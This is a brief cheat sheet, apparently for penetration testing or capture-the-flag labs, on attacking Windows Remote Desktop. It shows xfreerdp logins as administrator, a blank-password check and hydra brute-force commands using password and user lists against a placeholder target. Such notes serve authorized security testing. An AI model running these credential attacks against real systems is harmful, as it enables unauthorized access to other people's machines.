## Connect Using xfreerdp (Linux)

```bash
xfreerdp /u:administrator /p:password /v:<T_IP>
```

## Connect Without Password (Test Blank Password)

```bash
xfreerdp /u:administrator /v:<T_IP>
```

## RDP Bruteforce

```bash
hydra -l administrator -P passwords.txt rdp://<T_IP>
```

## RDP Bruteforce with User List

```bash
hydra -L users.txt -P passwords.txt rdp://<T_IP>
```
